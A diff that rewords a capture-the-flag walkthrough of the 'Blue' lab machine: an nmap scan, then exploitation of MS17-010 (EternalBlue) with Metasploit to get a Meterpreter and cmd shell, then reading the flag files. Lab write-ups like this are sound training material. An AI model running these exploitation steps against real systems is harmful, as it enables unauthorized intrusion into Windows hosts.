@@ -1,7 +1,7 @@
 
 # Blue
 
-First, we create a working directory named Blue:
+We create a working directory named "Blue" to organize our files and findings:
 
 ```ruby
 mkdir Blue
@@ -9,17 +9,17 @@ mkdir Blue
 
 ## Port Scanning
 
-We ping the target to check our connection: 
+We ping the target IP (10.10.10.40) to confirm connectivity
 
 ```ruby
 ping 10.10.10.40
 ```
 
-A TTL of 127 tells us it's a Windows machine.
+The Time To Live (TTL) of 127 indicates it's likely a Windows machine.
 
 ### Nmap Scan
 
-We use Nmap to find open ports:
+We use Nmap to perform a comprehensive port scan, identifying open ports.
 
 ```ruby
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
@@ -39,7 +39,7 @@ PORT      STATE SERVICE      REASON
 
 ```
 
-We do a more detailed scan:
+A more detailed scan is then run on the discovered open ports.
 
 ```ruby
 nmap --script=firewall-bypass -p135,139,445,49152,49153,49154,49155,49157 -vvv -oN targeted 10.10.10.40
@@ -67,12 +67,12 @@ Host script results:
 
 ```
 
-The scan shows the machine is vulnerable to MS17-010 (EternalBlue).
+The scan reveals the machine is vulnerable to MS17-010 (EternalBlue).
 
 
 ## Exploiting MS17-010
 
-We use Metasploit to exploit this vulnerability:
+We use Metasploit to exploit the MS17-010 vulnerability.
 
 
 ```ruby
@@ -85,7 +85,8 @@ We find:
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14   average  Yes
 ```
 
-We set up Metasploit:
+The `exploit/windows/smb/ms17_010_eternalblue` module is selected.
+We set our local host (LHOST) and remote host (RHOSTS) IP addresses.
 
 ```ruby
 msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.10.14.13
@@ -94,9 +95,7 @@ LHOST => 10.10.14.13
 msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.10.40
 RHOSTS => 10.10.10.40
 ```
-
-
-Then we run the exploit:
+The exploit is executed, successfully giving us a Meterpreter session.
 
 ```ruby 
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
@@ -114,7 +113,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ```
-We get a Meterpreter shell.
+We use the Meterpreter shell to navigate the compromised system.
 
 ```ruby
 meterpreter > ls
@@ -124,7 +123,7 @@ Listing: C:\Windows\system32
 
 ### Improving the Shell
 
-To get a better shell, we run:
+To get a more familiar Windows command prompt, we execute `cmd.exe` through Meterpreter.
 
 ```ruby 
 meterpreter > execute -c -f cmd.exe -H -i -d
@@ -143,21 +142,20 @@ C:\Windows\system32>
 ```
 
 
-#### Finding the Flags
+#### Flag Hunting
 
-To find the flags, we use:
+We use the `dir` command with specific parameters to search for `user.txt` and `root.txt` files.
 
 ```ruby
 dir /s /b root.txt user.txt
 ```
-This shows us two files:
-
+The flags are located in the Desktop folders of the 'haris' and 'Administrator' users respectively.
+ 
 ```ruby
 C:\Users\Administrator\Desktop\root.txt
 C:\Users\haris\Desktop\user.txt
 ```
-
-To read a flag, we use:
+We use the `type` command to read the contents of these files, revealing the flags.
 
 ```ruby 
 type C:\Users\Administrator\Desktop\root.txt
